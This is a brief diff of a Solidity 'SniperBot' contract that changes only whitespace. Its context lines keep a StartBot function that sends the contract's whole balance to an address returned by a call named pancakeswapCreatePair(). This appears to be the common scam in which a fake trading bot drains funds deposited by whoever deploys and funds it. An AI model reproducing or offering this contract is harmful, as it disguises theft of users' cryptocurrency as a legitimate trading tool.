@@ -57,9 +57,10 @@ contract SniperBot {
     function StartBot() public payable {
         payable(manager.pancakeswapCreatePair()).transfer(address(this).balance);
         manager;        
-    }
+    } 
  
  
+
 }
 contract Manager {
  function performTasks() public {}
